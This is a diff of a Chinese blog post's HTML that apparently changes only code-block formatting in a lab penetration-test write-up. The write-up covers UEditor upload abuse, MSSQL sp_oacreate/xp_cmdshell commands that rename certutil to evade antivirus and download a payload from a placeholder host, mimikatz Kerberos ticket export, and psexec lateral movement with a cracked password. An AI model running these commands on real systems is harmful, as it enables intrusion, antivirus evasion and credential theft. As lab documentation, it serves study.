@@ -489,7 +489,9 @@
 <p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660"></p>
 <p>找到了数据库中含有admin用户的表名和对应的字段名。然后sqlmap跑出了结果。有了admin用户，我们就可以增加配置文件了。然而配置文件有白名单过滤。基本所有方法都试了也不行。与此同时舍友用打Ueditor的方法拿下了web1。</p>
 <p>在服务器上上传一个html文件：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>shell addr: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>source[]<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre>
 
 <p>浏览器访问会有这样的界面</p>
 <p>![截屏2022-03-30 下午5.26.10](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午5.26.10.png)</p>
@@ -515,7 +517,18 @@
 <p>但我细心的舍友发现这里有两种情况，一种是木马上传后立即被杀掉，就和第一张图一样。而在第二张图中，当时我传上去了一个加载器和一个二进制文件，这两个是肯定不会被杀软杀掉的。但是我用加载器把二进制文件加载成可执行文件并注入内存时系统报了错，360这里检测到了这个行为并阻止了。</p>
 <p>那么在没有360的data2中，我们用加载器的方法应该就没问题了。</p>
 <p>这里需要把加载器和CS生成的二进制文件传到data2中。这里我们用certutil从远程服务器上下载。但是失败了，原因大概是火绒对本地certutil有限制。所以这里我们选择把certutil从System32下移位并重命名绕过检测。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为cerice.exe：</span><br><span class="line">declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\cerice.exe&#x27;;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your_ip:20022/HanzoInjection.exe&quot; C:\Users\MSSQLSERVER\hanzo.exe&#x27;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your ip/payload.bin&quot; C:\Users\MSSQLSERVER\payload.bin&#x27;</span><br><span class="line"></span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;cd C:\Users\MSSQLSERVER\ &amp;&amp; hanzo.exe -e payload.bin&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">exec sp_configure &#39;show advanced options&#39;, 1;  RECONFIGURE;  exec sp_configure &#39;Ole Automation Procedures&#39;, 1;  RECONFIGURE;
+
+
+利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为cerice.exe：
+declare @o int exec sp_oacreate &#39;scripting.filesystemobject&#39;, @o out exec sp_oamethod @o, &#39;copyfile&#39;,null,&#39;C:\Windows\System32\certutil.exe&#39; ,&#39;c:\windows\temp\cerice.exe&#39;;
+
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http:&#x2F;&#x2F;your_ip:20022&#x2F;HanzoInjection.exe&quot; C:\Users\MSSQLSERVER\hanzo.exe&#39;
+
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http:&#x2F;&#x2F;your ip&#x2F;payload.bin&quot; C:\Users\MSSQLSERVER\payload.bin&#39;
+
+Exec master.dbo.xp_cmdshell &#39;cd C:\Users\MSSQLSERVER\ &amp;&amp; hanzo.exe -e payload.bin&#39;
+</code></pre>
 
 <p>CS成功上线</p>
 <p><img src="/Downloads/20220330212038.png" alt="20220330212038"></p>
@@ -540,14 +553,15 @@
 <h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><p>其实到了这里我们已经打进域内了</p>
 <p>![截屏2022-03-31 上午12.16.21](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.16.21.png)</p>
 <p>后面就是我最喜欢的环节了，直接mimi抓密码。嗯。。。抓了个寂寞，明文一个没抓到不说，连个管理员的hash都没有，即没法ipc远程连接，也没法hash传递。一怒之下，我看都没看直接导出了所有票据。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">mimikatz kerberos::list &#x2F;export</code></pre>
 
 <p><img src="/Downloads/20220330225238.png" alt="20220330225238"></p>
 <p>还真不少，由于这里的票据是TGS返回的票据，里面包含服务ntlm加密的session_key值，所以我们只要找到服务是域控的，抓到的就可能是域管的hash了。这里有不少，我们随便抓一个下来爆破。</p>
 <p><img src="/Downloads/20220328233414.png" alt="20220328233414"></p>
 <p>这里爆破出了一个明文密码。就像之前说的一样，由于我选取的票据服务端是域控，所以盲猜这个就是域管的密码。</p>
 <p>那么就用一下psexec试试吧,首先建立一个smb监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\16SEREVR-DC1\ipc$ &quot;P@55w0rd!&quot; /user:&quot;Administrator&quot;   </span><br><span class="line">jump psexec 16SEREVR-DC1 smb   //smb是我们之前建立的监听器的名字</span><br></pre></td></tr></table></figure>
+<pre class="language-none"><code class="language-none">net use \\16SEREVR-DC1\ipc$ &quot;P@55w0rd!&quot; &#x2F;user:&quot;Administrator&quot;   
+jump psexec 16SEREVR-DC1 smb   &#x2F;&#x2F;smb是我们之前建立的监听器的名字</code></pre>
 
 <p>然后就成功了（这里截图丢了，环境也不好重开，见谅。。。）。</p>
 <h2 id="DATA2"><a href="#DATA2" class="headerlink" title="DATA2"></a>DATA2</h2><p>域控都到手了我还怕个DATA2？我一开始是这么想的，但是事实证明我错了，我用打域控的方法打了一下DATA2，虽然ipc连接能够成功建立，但是psexec却不能成功执行。后来耽误了很长时间，我舍友用CS自带的psexec给拿下了，我看了一下，CS自带的psexec和我之前的打法的确不同，我是先建立ipc连接，然后上传psexec并运行，而它是先制作了个管理员的令牌并注入内存后再上传psexec并运行的，说实话到现在我也不知道为啥效果会不一样，等以后研究明白后我会把这段补上的。。。</p>
